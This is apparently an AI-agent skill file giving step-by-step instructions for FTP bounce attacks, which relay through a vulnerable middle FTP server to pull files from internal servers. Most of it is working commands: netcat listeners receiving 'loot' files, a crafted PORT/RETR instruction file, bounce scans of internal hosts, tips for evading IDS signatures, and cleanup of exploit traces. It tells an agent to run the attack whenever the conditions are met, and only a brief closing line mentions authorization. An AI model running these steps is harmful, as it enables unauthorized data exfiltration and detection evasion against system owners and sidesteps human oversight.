---
name: ftp-bounce-download
description: Use FTP bounce attacks to download files from a victim FTP server through a vulnerable middle FTP server. Use this skill whenever you have FTP credentials for a middle server and need to access files on another FTP server that the middle server can reach but you cannot directly access. Trigger this when you discover an FTP bounce vulnerability (via nmap ftp-bounce script) and need to exfiltrate files from internal/protected FTP servers.
---

# FTP Bounce Download

This skill enables downloading files from a victim FTP server by exploiting a vulnerable middle FTP server that supports the `PORT` command (FTP bounce vulnerability).

## When to Use This Skill

Use this skill when:
- You have valid FTP credentials for a **middle server**
- You have valid FTP credentials for a **victim FTP server**
- The middle server accepts the `PORT` command (bounce FTP attack)
- You can write to a directory on the middle server
- The middle server has more access to the victim FTP server than you do
- You need to exfiltrate files from an internal/protected FTP server

## Prerequisites

Before using this skill, verify:
1. **Middle server is bounce-vulnerable**: Run `nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>`
2. **You have write access** to the middle server's FTP
3. **You have credentials** for both the middle and victim FTP servers
4. **You can receive data** on a listener port from the victim server

## Quick Vulnerability Check

```bash
# Check if middle server supports FTP bounce
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>

# Or attempt a bounce scan directly
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```

If the scan succeeds, the server is vulnerable. Embedded/legacy printers, NAS devices, and appliance FTP daemons often still allow this.

## Attack Workflow

### Step 1: Set Up Your Listener

Open a passive listener on your attack box to receive the file:

```bash
# Simple netcat listener
nc -lvnp 2121 > loot.bin

# Or use socat for more control
socat -u TCP-LISTEN:2121,fork - > loot.bin

# Or use a Python FTP server (pyftpdlib)
python3 -m pyftpdlib -p 2121 -w /tmp/loot
```

**Note your IP and port** - you'll need these for the PORT command.

### Step 2: Calculate PORT Command Values

The PORT command uses comma-separated values:
- IP: `A,B,C,D` (your IP address octets)
- Port: `p1,p2` where `p1 = port/256` and `p2 = port%256`

**Example**: For port 2121:
- `p1 = 2121/256 = 8`
- `p2 = 2121%256 = 89`
- PORT value: `A,B,C,D,8,89`

### Step 3: Create the Instruction File

Build the file that the middle server will replay to the victim:

```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF

# Add padding to keep control channel open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

**Why padding?** Large TCP windows can cause the control connection to close before RETR finishes. The padding prevents this.

### Step 4: Upload and Trigger from Middle Server

Connect to the middle server and execute the bounce:

```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

**Explanation**:
- `put instrs`: Uploads your instruction file to the middle server
- `PORT <victim_ip>,0,21`: Tells middle server to connect to victim FTP on port 21
- `RETR instrs`: Makes middle server send the instruction file to victim, which executes the commands

### Step 5: Capture the File

The victim server will send the requested file to your listener:

```bash
# Check your listener output
cat loot.bin

# If using netcat, the file should already be captured
ls -la loot.bin
```

### Step 6: Clean Up

Remove the exploit file from the middle server:

```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
delete instrs
QUIT
EOF
```

## Using the Automation Script

For a streamlined workflow, use the bundled script:

```bash
# Run the FTP bounce download
./scripts/ftp-bounce-download.sh \
  --middle-ip 192.168.1.100 \
  --middle-user admin \
  --middle-pass password123 \
  --victim-ip 10.0.0.50 \
  --victim-user victim \
  --victim-pass victimpass \
  --file /secret/data.tar.gz \
  --listener-port 2121
```

## Advanced Techniques

### Port Scanning Internal Hosts

Use a bounceable FTP server to port-scan internal hosts when file relay is blocked:

```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```

### Handling WAF/IDS

Some modern WAF/IDS (e.g., Juniper IPS) have signatures for `FTP:EXPLOIT:BOUNCE-ATTACK`:
- Use padding to avoid detection
- Avoid noisy payloads
- Consider timing-based evasion

### When Middle Server Restricts PORT

If the middle server enforces "PORT to same host" restrictions:
1. Place your listener on the middle server itself (if you have write/execute access)
2. Forward the captured file later

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Connection refused | Verify middle server accepts PORT command with nmap ftp-bounce script |
| File empty/corrupted | Add more padding (increase dd count) |
| Control connection closes early | Increase padding size or use larger TCP window |
| Permission denied on victim | Verify victim credentials and file path |
| Listener not receiving data | Check firewall rules and verify PORT values are correct |

## Safety Notes

- **Authorization**: Only use this technique on systems you have explicit permission to test
- **Detection**: FTP bounce attacks are well-known and may trigger IDS/IPS alerts
- **Cleanup**: Always remove exploit files from the middle server after use
- **Logging**: These attacks leave traces on both middle and victim servers

## References

- [Nmap book – TCP FTP Bounce Scan](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
- [Original FTP Bounce Tutorial](http://www.ouah.org/ftpbounce.html)
